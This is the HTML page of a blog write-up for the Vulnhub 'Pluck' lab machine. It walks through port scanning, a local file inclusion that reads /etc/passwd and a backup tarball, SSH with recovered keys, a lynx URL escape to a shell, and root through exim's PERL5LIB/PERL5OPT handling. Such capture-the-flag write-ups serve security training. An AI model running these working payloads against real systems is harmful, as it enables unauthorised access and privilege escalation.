@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="Let us discuss your security">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="One Plus &lt;weirdless.info@gmail.com&gt;">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Vulnhub - Pluck"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="Let us discuss your security" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="One Plus - X"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>Vulnhub - Pluck - One Plus - X</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+ <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81899858-1"></script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-81899858-1', 'auto');
+  ga('send', 'pageview');
+		
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-81899858-1');
+</script>
+
+    <!-- Google Adsense -->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-2313105504330449",
+    enable_page_level_ads: true
+  });
+</script>
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/cheatsheet">
+                    Cheatsheets
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    Contact
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/cheatsheet">
+                    Gallery
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/catch">
+                    Catch ME
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/OSINTToolkit">
+                    OSINTToolkit
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-code" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/03/12/Pluck1/">
+                Vulnhub - Pluck
+            </a>
+        </h1>
+        <div class="post-info">
+
+
+            
+                <span class="author">Author: <a href="https://twitter.com/One_PlusX" target="_blank">Tanoy Bose</a></span> <br>
+            
+
+
+            
+                <span class="date">2017-03-12</span>
+            
+            <a href="#disqus_thread" class="comments">Comments</a>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Just another writeup for another Vulnhub Challenge.</p>
+<a id="more"></a>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Figure out IP. Ofcourse, when you boot the machine it shows you the IP before the login as well.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ nmap -vvv -p- -A 192.168.56.101</div><div class="line"></div><div class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-12 17:42 IST</div><div class="line">NSE: Loaded 143 scripts <span class="keyword">for</span> scanning.</div><div class="line">NSE: Script Pre-scanning.</div><div class="line">NSE: Starting runlevel 1 (of 2) scan.</div><div class="line">Initiating NSE at 17:42</div><div class="line">Completed NSE at 17:42, 0.00s elapsed</div><div class="line">NSE: Starting runlevel 2 (of 2) scan.</div><div class="line">Initiating NSE at 17:42</div><div class="line">Completed NSE at 17:42, 0.00s elapsed</div><div class="line">Initiating ARP Ping Scan at 17:42</div><div class="line">Scanning 192.168.56.101 [1 port]</div><div class="line">Completed ARP Ping Scan at 17:42, 0.04s elapsed (1 total hosts)</div><div class="line">Initiating Parallel DNS resolution of 1 host. at 17:42</div><div class="line">Completed Parallel DNS resolution of 1 host. at 17:42, 0.00s elapsed</div><div class="line">DNS resolution of 1 IPs took 0.00s. Mode: Async [<span class="comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span></div><div class="line">Initiating SYN Stealth Scan at 17:42</div><div class="line">Scanning 192.168.56.101 [65535 ports]</div><div class="line">Discovered open port 80/tcp on 192.168.56.101</div><div class="line">Discovered open port 22/tcp on 192.168.56.101</div><div class="line">Discovered open port 3306/tcp on 192.168.56.101</div><div class="line">Discovered open port 5355/tcp on 192.168.56.101</div><div class="line">Completed SYN Stealth Scan at 17:42, 1.27s elapsed (65535 total ports)</div><div class="line">Initiating Service scan at 17:42</div><div class="line">Scanning 4 services on 192.168.56.101</div><div class="line">Completed Service scan at 17:44, 115.33s elapsed (4 services on 1 host)</div><div class="line">Initiating OS detection (try <span class="comment">#1) against 192.168.56.101</span></div><div class="line">NSE: Script scanning 192.168.56.101.</div><div class="line">NSE: Starting runlevel 1 (of 2) scan.</div><div class="line">Initiating NSE at 17:44</div><div class="line">Completed NSE at 17:44, 0.16s elapsed</div><div class="line">NSE: Starting runlevel 2 (of 2) scan.</div><div class="line">Initiating NSE at 17:44</div><div class="line">Completed NSE at 17:44, 1.01s elapsed</div><div class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</div><div class="line">Host is up, received arp-response (0.00032s latency).</div><div class="line">Scanned at 2017-03-12 17:42:22 IST <span class="keyword">for</span> 119s</div><div class="line">Not shown: 65531 closed ports</div><div class="line">Reason: 65531 resets</div><div class="line">PORT     STATE SERVICE REASON         VERSION</div><div class="line">22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)</div><div class="line">| ssh-hostkey: </div><div class="line">|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)</div><div class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFSQzgfwHXqd1xWOgf75774FzsNjlHCbQMrxD/YxArRbHivjZaqVegVI3sUiy6uO/DLcmnnjxEKpJq0QNWXIi438ctaJzDnxIeeY1WxFVNgxidy0TUdzAOPsclC9v4SeWJS1XnsrPpWWRyBI1J/KdYOtdwtJ3D7YBKONsDMokhotPiGY<span class="keyword">in</span>BD+DYIyyWKVpNi/6Pj2PqrT1f9KZMlMdda1yEE4x0/vy0tABWnLAR9JlzbDkLY9JpFoZb7Cs+xcwpcj0JNHKnN5IfpyZZ+vGDRdxB4twukRBFkljAxkZb8/QUO83om4vTgr9eLMV4cgwIA8IJsi83puCM<span class="keyword">fi</span>Nrg+VfNwN</div><div class="line">|   256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)</div><div class="line">|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN5PvwhQy4P3+wVM+Tl9dFNeO1MWbOR50xImivscOMxL6HRVDbyYSFE8anA/SQntiOFqIkgk16pHSYXB2w5sgzQ=</div><div class="line">80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))</div><div class="line">| http-methods: </div><div class="line">|_  Supported Methods: GET HEAD POST OPTIONS</div><div class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</div><div class="line">|_http-title: Pluck</div><div class="line">3306/tcp open  mysql   syn-ack ttl 64 MySQL (unauthorized)</div><div class="line">5355/tcp open  llmnr?  syn-ack ttl 1</div><div class="line">MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)</div><div class="line">Device <span class="built_in">type</span>: general purpose</div><div class="line">Running: Linux 3.X|4.X</div><div class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div class="line">OS details: Linux 3.2 - 4.6</div><div class="line">TCP/IP fingerprint:</div><div class="line">OS:SCAN(V=7.40%E=4%D=3/12%OT=22%CT=1%CU=35977%PV=Y%DS=1%DC=D%G=Y%M=080027%T</div><div class="line">OS:M=58C53B9D%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=I%II=I</div><div class="line">OS:%TS=8)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O</div><div class="line">OS:5=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6</div><div class="line">OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</div><div class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</div><div class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</div><div class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</div><div class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</div><div class="line">OS:N%T=40%CD=S)</div><div class="line"></div><div class="line">Uptime guess: 0.002 days (since Sun Mar 12 17:40:53 2017)</div><div class="line">Network Distance: 1 hop</div><div class="line">TCP Sequence Prediction: Difficulty=256 (Good luck!)</div><div class="line">IP ID Sequence Generation: All zeros</div><div class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div><div class="line"></div><div class="line">TRACEROUTE</div><div class="line">HOP RTT     ADDRESS</div><div class="line">1   0.32 ms 192.168.56.101</div><div class="line"></div><div class="line">NSE: Script Post-scanning.</div><div class="line">NSE: Starting runlevel 1 (of 2) scan.</div><div class="line">Initiating NSE at 17:44</div><div class="line">Completed NSE at 17:44, 0.00s elapsed</div><div class="line">NSE: Starting runlevel 2 (of 2) scan.</div><div class="line">Initiating NSE at 17:44</div><div class="line">Completed NSE at 17:44, 0.00s elapsed</div><div class="line">Read data files from: /usr/bin/../share/nmap</div><div class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 120.64 seconds</div><div class="line">           Raw packets sent: 65558 (2.885MB) | Rcvd: 65554 (2.623MB)</div></pre></td></tr></table></figure></p>
+<p>LLMNR? Http with admin page?</p>
+<p>For LLMNR, I run the following in the hopes of intercepting something at the very least (but to no success)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">responder -wrfF -I vboxnet0</div></pre></td></tr></table></figure></p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Trying the usual, I went to the About page to run CeWL on it and get myself a bruteforce dictionary. While doing this, I observed the URL to be interesting.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/index.php?page=about.php</div></pre></td></tr></table></figure></p>
+<p>Hmmm, possible LFI? Let me try.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/index.php?page=/etc/passwd</div></pre></td></tr></table></figure></p>
+<p>BAM!!!<br><img src="/2017/03/12/Pluck1/LFI.png" alt="LFI" title="LFI"></p>
+<p>Ok, what did I see here?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</div><div class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</div><div class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</div><div class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</div><div class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</div><div class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</div><div class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</div><div class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</div><div class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</div><div class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</div><div class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</div><div class="line">syslog:x:104:108::/home/syslog:/bin/false</div><div class="line">_apt:x:105:65534::/nonexistent:/bin/false</div><div class="line">messagebus:x:106:109::/var/run/dbus:/bin/false</div><div class="line">mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false</div><div class="line">lxd:x:108:65534::/var/lib/lxd/:/bin/false</div><div class="line">uuidd:x:109:114::/run/uuidd:/bin/false</div><div class="line">dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false</div><div class="line">sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">pollinate:x:112:1::/var/cache/pollinate:/bin/false</div><div class="line">bob:x:1000:1000:bob,,,:/home/bob:/bin/bash</div><div class="line">Debian-exim:x:113:119::/var/spool/exim4:/bin/false</div><div class="line">peter:x:1001:1001:,,,:/home/peter:/bin/bash</div><div class="line">paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu</div><div class="line">backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh</div></pre></td></tr></table></figure>
+<p>let us call the backup script and see what is being done with this<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/index.php?page=/usr/local/scripts/backup.sh</div><div class="line">#!/bin/bash</div><div class="line"></div><div class="line">########################</div><div class="line"># Server Backup script #</div><div class="line">########################</div><div class="line"></div><div class="line">#Backup directories in /backups so we can get it via tftp</div><div class="line"></div><div class="line">echo &quot;Backing up data&quot;</div><div class="line">tar -cf /backups/backup.tar /home /var/www/html &gt; /dev/null 2&amp; &gt; /dev/null</div><div class="line">echo &quot;Backup complete&quot;</div></pre></td></tr></table></figure></p>
+<p>ahaa! A tar file with all contents for /home and /var/www/html. Let us get hold of it.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ curl http://192.168.56.101/index.php?page=/backups/backup.tar &gt; backup.tar</div></pre></td></tr></table></figure></p>
+<p>At this stage my machines gets stuck (Yes, I am a damn poor boy!). However, after leaving my machine up for a while and having some snacks and returning, it seemed curl had done its best. Next was to untar the file and extract the contents.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ tar -xfv backup.tar</div></pre></td></tr></table></figure></p>
+<p>I see the interesting /home/ folder. While searching around, I end up with /home/paul/keys/id_key*. On trying each one of them, I could finally figure out which one was the correct key and was able to ssh into the machine.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ chmod 600 id_rsa*</div><div class="line">oneplus@root$ ssh -v -i id_key4 paul@192.168.56.101</div></pre></td></tr></table></figure></p>
+<p>And now we have a PDMenu to crack.<br><img src="/2017/03/12/Pluck1/pdmenu_1.png" alt="pdmenu" title="pdmenu"></p>
+<p>I must say, it took me some time to figure out this one because our dear game writer had set up a lot of honey traps to get you distracted.</p>
+<h2 id="Interactive-Shell"><a href="#Interactive-Shell" class="headerlink" title="Interactive Shell"></a>Interactive Shell</h2><p>So, I read an interesting article <a href="http://insecure.org/sploits/lynx.download.html" target="_blank" rel="external">here</a>. Attempting the same,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Exploit Code =</div><div class="line">LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null</div></pre></td></tr></table></figure>
+<img src="/2017/03/12/Pluck1/pdmenu_2.png" alt="pdmenu lynx" title="pdmenu lynx">
+<img src="/2017/03/12/Pluck1/pdmenu_3.png" alt="lynx exploit" title="lynx exploit">
+<img src="/2017/03/12/Pluck1/lynx_quit.png" alt="quit lynx" title="quit lynx">
+<img src="/2017/03/12/Pluck1/interactive_login.png" alt="shell" title="shell">
+<h2 id="Rooting"><a href="#Rooting" class="headerlink" title="Rooting"></a>Rooting</h2><p>The amazing part of this image is there are more than one possible ways of getting an interactive shell. Eventhough I pwn’d this via lynx exploit, while trying to root the system, I figured out there are quite a few ways that we could get access to an interactive shell.<br>Looking up the systen information and kernel version and other information, there was again more than one possible ways to root this box. Unfortunately on my first attempt (most of them were compilation fails maybe because I didn’t try to rectify the underlying code), keyctl, dirtycow and pkexec race condition (and a few more that failed), this is the enumeration that led to me rooting the box.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">$ bash</div><div class="line">paul@pluck$ find / -perm -4000 2&gt;/dev/null</div><div class="line">-----------------------------------------------</div><div class="line">/usr/exim/bin/exim-4.84-7</div><div class="line">/usr/bin/passwd</div><div class="line">/usr/bin/at</div><div class="line">/usr/bin/newgrp</div><div class="line">/usr/bin/pkexec</div><div class="line">/usr/bin/sudo</div><div class="line">/usr/bin/traceroute6.iputils</div><div class="line">/usr/bin/newuidmap</div><div class="line">/usr/bin/chfn</div><div class="line">/usr/bin/gpasswd</div><div class="line">/usr/bin/newgidmap</div><div class="line">/usr/bin/chsh</div><div class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</div><div class="line">/usr/lib/policykit-1/polkit-agent-helper-1</div><div class="line">/usr/lib/s-nail/s-nail-privsep</div><div class="line">/usr/lib/openssh/ssh-keysign</div><div class="line">/usr/lib/eject/dmcrypt-get-device</div><div class="line">/bin/su</div><div class="line">/bin/umount</div><div class="line">/bin/mount</div><div class="line">/bin/fusermount</div><div class="line">/bin/ping</div><div class="line">/bin/ntfs-3g</div><div class="line">------------------------------------------------</div><div class="line"></div><div class="line">paul@pluck$ vi /tmp/root.pm</div><div class="line">------------------------------------------------</div><div class="line">package root;</div><div class="line">use strict;</div><div class="line">use warnings;</div><div class="line"> </div><div class="line">system(<span class="string">"/bin/sh"</span>);</div><div class="line">------------------------------------------------</div><div class="line"></div><div class="line">paul@pluck$ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</div><div class="line"><span class="comment"># whoami</span></div><div class="line">root</div><div class="line"><span class="comment">#id</span></div><div class="line">uid=0(root) gid=1002(paul) groups=1002(paul) </div><div class="line"><span class="comment">#</span></div></pre></td></tr></table></figure>
+<p>PWNED!</p>
+<h2 id="cat-root-flag-txt"><a href="#cat-root-flag-txt" class="headerlink" title="cat /root/flag.txt"></a>cat /root/flag.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Congratulations you found the flag</div><div class="line"></div><div class="line">---------------------------------------</div><div class="line"></div><div class="line">######   ((((((((((((((((((((((((((((((</div><div class="line">#########   (((((((((((((((((((((((((((</div><div class="line">,,##########   ((((((((((((((((((((((((</div><div class="line">@@,,,##########   (((((((((((((((((((((</div><div class="line">@@@@@,,,##########                     </div><div class="line">@@@@@@@@,,,############################</div><div class="line">@@@@@@@@@@@,,,#########################</div><div class="line">@@@@@@@@@,,,###########################</div><div class="line">@@@@@@,,,##########                    </div><div class="line">@@@,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</div><div class="line">,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</div><div class="line">##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</div><div class="line">#######   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</div></pre></td></tr></table></figure>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/Vulnhub/">#Vulnhub</a> <a href="/tags/Pluck/">#Pluck</a> <a href="/tags/boot2root/">#boot2root</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+    <div class="comments">
+        
+<div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+    </div>
+    
+
+</div>
+
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    Tanoy "NoTTY" Bose is a Security Consultant at a Big 4 (That is in the top 25 of Cybersecurity ventures). He performs a wide range of security assessments but generally prefers red teaming. As a gamer, Tanoy loves to play DotA2 and Counter Strike 1.6. While free, Tanoy is involved in doing interesting life hacks or play any CTF that is running.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2017/03/12/Pluck1/">Vulnhub - Pluck</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/02/25/kioptrix-1/">Vulnhub - OSCP Series - K</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/02/25/ISP-Hacking/">All your creds are belong</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2016/11/30/Red-Team-Ratatouille/">The Red Team&#39;s Ratatouill</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.github.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/One_PlusX?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
